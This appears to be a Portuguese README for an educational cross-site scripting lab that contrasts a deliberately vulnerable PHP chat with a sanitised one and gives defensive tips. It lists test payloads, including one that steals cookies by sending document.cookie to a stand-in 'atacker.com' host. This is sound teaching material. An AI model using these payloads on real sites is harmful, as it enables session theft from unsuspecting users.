# 🚨 Cross-Site Scripting (XSS) Lab

Exemplos práticos de XSS e como se proteger.

## 📁 Arquivos

### 🔓 vulnerable_chat.php
**Código vulnerável** - Mostra como NÃO fazer:
- Renderização direta de input do usuário
- Vulnerável a: `<script>alert('XSS')</script>`
- Permite execução de JavaScript malicioso

### 🔒 secure_chat.php  
**Código seguro** - Mostra como fazer CERTO:
- Sanitização com `htmlspecialchars()`
- Encoding ENT_QUOTES + UTF-8
- Proteção total contra XSS

## 💡 Payloads de Teste

### XSS Básico
`<script>alert('XSS')</script>`

### XSS com Imagem
`<img src=x onerror=alert(1)>`

### XSS com SVG
`<svg onload=alert('Hacked')>`

### Roubo de Cookies
`<script>fetch('http://atacker.com/steal?cookie='+document.cookie)</script>`

## 🛡️ Como Proteger

1. **Use htmlspecialchars()** para outputs
2. **Content Security Policy (CSP)**
3. **Validação de input** no client e server
4. **HTTPOnly cookies**
5. **Escaping context-aware**

## ⚠️ AVISO
**Use apenas para educação em ambiente controlado!**
